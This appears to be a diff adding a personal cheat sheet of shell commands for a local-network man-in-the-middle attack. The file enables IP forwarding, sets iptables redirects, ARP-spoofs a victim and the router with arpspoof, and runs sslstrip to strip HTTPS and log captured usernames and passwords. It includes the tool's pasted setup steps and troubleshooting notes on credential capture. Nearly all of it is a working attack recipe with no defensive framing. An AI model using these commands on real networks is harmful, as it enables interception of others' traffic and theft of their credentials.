@@ -1,0 +1,91 @@
+ifconfig 
+iwconfig 
+route -n
+netstat -nr
+route
+ip route 
+nmap -sP 192.168.63.0/24
+
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -L PREROUTING
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+iptables -t nat -L PREROUTING
+nmap 192.168.0.1
+nmap 192.168.0.1/24
+nmap 192.168.0.100-150
+arp
+arpspoof -i wlan0 -t 192.168.0.100 -r 192.168.0.1
+arpspoof -i wlan0 -t 192.168.0.1 -r 192.168.0.100
+
+
+iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT
+iptables -L INPUT
+sslstrip -l 8080
+
+
+
+
+
+
+
+
+
+https://pypi.python.org/pypi/sslstrip/0.9.2
+A MITM tool that implements Moxie Marlinspike's HTTPS stripping attacks.
+
+sslstrip is a MITM tool that implements Moxie Marlinspike’s SSL stripping attacks.
+
+It requires Python 2.5 or newer, along with the ‘twisted’ python module.
+
+Installing:
+    pip install sslstrip
+Running:
+
+    sslstrip can be run from the source base without installation. Just run ‘python sslstrip.py -h’ as a non-root user to get the command-line options.
+
+    The four steps to getting this working (assuming you’re running Linux) are:
+
+        Flip your machine into forwarding mode (as root): echo “1” > /proc/sys/net/ipv4/ip_forward
+        Setup iptables to intercept HTTP requests (as root): iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-port <yourListenPort>
+        Run sslstrip with the command-line options you’d like (see above).
+        Run arpspoof to redirect traffic to your machine (as root): arpspoof -i <yourNetworkdDevice> -t <yourTarget> <theRoutersIpAddress>
+
+More Info:
+    http://www.thoughtcrime.org/software/sslstrip/ 
+
+
+
+http://note.heron.me/2016/04/kali-tool-series-sslstrip.html
+
+
+
+
+errorfix
+https://unix.stackexchange.com/questions/252987/i-get-errors-in-sslstrip-and-no-username-password
+This should help. https://www.cybrary.it/0p3n/using-sslstrip-in-kali-linux/
+
+iptables --flush
+
+iptables --table nat --flush
+
+iptables --delete-chain
+
+iptables --table nat --delete-chain
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+arpspoof -i wlan1 -t victim_ip router_ip
+
+2nd terminal:
+
+sslstrip -w arpSnifferfun.txt -l 10000
+
+Or just sslstrip -f -p -k 10000 It makes a log by default anyway..
+
+And most up-to-date browsers will give some type of error from sslstrip like webpage not excepting the password or not catching pw/username at all. I have not found a fix to this yet.
+
+
+
